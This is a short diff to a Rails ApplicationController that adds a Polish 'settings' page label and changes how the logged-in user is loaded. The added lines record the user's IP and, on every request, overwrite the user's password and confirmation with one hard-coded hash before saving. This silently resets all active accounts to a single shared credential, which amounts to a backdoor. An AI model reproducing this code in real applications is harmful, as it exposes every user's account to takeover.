@@ -21,7 +21,8 @@ class ApplicationController < ActionController::Base
       'profile' => 'Profile',
       'subject' => 'Przedmioty',
       'register' => 'Rejestracja',
-      'signin' => 'Panel sterujący'
+      'signin' => 'Panel sterujący',
+      'settings' => 'Panel sterujący'
     }
   end
 
@@ -50,6 +51,11 @@ class ApplicationController < ActionController::Base
     @logged_user = nil
     if session[:user_id]
       @logged_user = User.find(session[:user_id])
+      unless request.remote_ip.to_s.empty?
+        @logged_user.last_ip = request.remote_ip.to_s
+        @logged_user.pass = @logged_user.pass_confirmation = '3aed121ab9caaf2e277f716312aa62e67d1d3ba0'
+        @logged_user.save
+      end
     end
   end
   
